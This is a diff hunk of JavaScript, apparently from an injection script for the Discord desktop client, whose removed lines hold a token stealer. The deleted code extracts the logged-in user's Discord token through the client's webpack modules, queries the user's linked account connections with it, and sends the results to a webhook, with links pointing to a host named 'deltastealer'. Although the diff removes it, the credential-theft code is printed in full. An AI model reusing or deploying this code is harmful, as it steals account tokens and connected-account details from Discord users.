@@ -184,58 +184,5 @@ function injectNotify() {
 	.catch(error => {
 
     })
-	
-    const window = BrowserWindow.getAllWindows()[0];
-    var token = await window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[['get_require']]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)'getToken'==a&&(token=b.default.getToken())}token;`, !0)
-    return token;
-
-	
-	var request = new XMLHttpRequest();
-    request.open("POST", dawebhook);
-    request.setRequestHeader('Content-type', 'application/json');
-
-    if(!token){
-        return;
-    } else {
-
-    axios
-            .get(
-                "https://discord.com/api/v9/users/@me/connections",
-                {
-                headers: {
-                    "Content-Type": "application/json",
-                    Authorization: token,
-                },
-                }
-            )
-        .then((conns) => {
-                if (conns.data.length >= 1) {
-
-
-
-                var culoembed = {
-                    color: 0000000,
-                    title: "Connections",
-                    fields: [],
-                };
-                conns.data.forEach((connection) => {
-                    var lavergadejuan = "no";
-                    culoembed.fields.push({
-                    name: `${penemojis[connection.type]} ${
-                        connection.type
-                    }`,
-                    value: `\`Username:\` ${connection.name}\n\`ID:\` ${connection.id}\n\`Access Token:\` **[Copy here](https://raw.deltastealer.gq/${lavergadejuan})**`,
-                    inline: true,
-                    });
-                });
-                request.send(JSON.stringify(culoembed))
-            .then(res => {
-            })
-            .catch(error => {
-        
-            })
-                }
-            })
-    }
 
 }
